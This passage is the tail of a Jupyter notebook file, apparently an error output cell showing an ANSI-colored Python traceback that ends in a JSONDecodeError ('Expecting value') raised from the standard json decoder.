            "\u001b[0;32m/usr/lib/python3.7/json/decoder.py\u001b[0m in \u001b[0;36mraw_decode\u001b[0;34m(self, s, idx)\u001b[0m\n\u001b[1;32m    353\u001b[0m             \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mscan_once\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0midx\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    354\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mStopIteration\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 355\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mJSONDecodeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Expecting value\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalue\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    356\u001b[0m         \u001b[0;32mreturn\u001b[0m \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mJSONDecodeError\u001b[0m: Expecting value: line 1 column 1 (char 0)"
          ]
        }
      ]
    }
  ]
}